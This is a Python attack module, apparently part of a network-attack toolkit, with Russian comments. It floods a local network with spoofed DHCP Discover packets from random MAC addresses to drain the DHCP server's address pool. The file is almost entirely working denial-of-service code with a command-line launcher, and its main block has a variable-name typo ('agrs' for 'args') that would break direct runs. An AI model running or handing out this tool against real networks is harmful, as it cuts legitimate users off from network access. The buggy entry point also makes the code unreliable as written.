import scapy.all as scapy
from scapy.all import Ether, IP, BOOTP, DHCP, UDP

import sys, os
sys.path.append(os.path.join('..','..'))
from config import *

import time, random

def rand_mac()->str:
    return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))

def dhcp_starve(args: dict)->None:
    if not validate_args(iface=args['iface']): return()
    print('DHCP-starvation attack module, version 1.0')
    iface = args['iface']
    try:
        print('*DHCP-starve started. Ctrl+C to stop')
        while True:
            # Генерируем случайный MAC
            mac_src=rand_mac()
            # Создаем слои пакета
            ether = Ether(dst='ff:ff:ff:ff:ff:ff', src=mac_src)
            ip = IP(src='0.0.0.0', dst='255.255.255.255')
            udp = UDP(sport=68, dport=67)
            bootp = BOOTP(
                op=1,  # BOOTREQUEST
                htype=1,  # Ethernet
                hlen=6,  # Длина MAC-адреса
                xid=random.randint(0, 0xFFFFFFFF),  # Случайный ID транзакции
                chaddr=bytes.fromhex(mac_src.replace(":", "")),  # MAC в бинарном формате
                flags=0x8000  # Broadcast флаг
            )
            dhcp = DHCP(options=[
                ('message-type', 'discover'),
                ('param_req_list', [1, 3, 6, 15, 31, 33]),  # Стандартные параметры
                'end'
            ])
            
            # Собираем полный пакет
            packet = ether/ip/udp/bootp/dhcp
            
            # Отправляем пакет
            try:
                scapy.sendp(packet, iface=iface, verbose=0)
                print(f"Sent DHCP Discover from MAC: {mac_src}")
            except Exception as e:
                print(f"{Fatal_Error}Packet was not sent: {Error_text}{e}{Clear}")
            time.sleep(0.1)  # Пауза между пакетами
    except KeyboardInterrupt:
        print('Aborted.')

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="DHCP-starvation attack module.")
    parser.add_argument("-i", "--iface", required=True, help="Network interface.")
    arg = parser.parse_args()
    
    agrs = {'iface': arg.iface}

    # Запускаем атаку
    dhcp_starve(args)
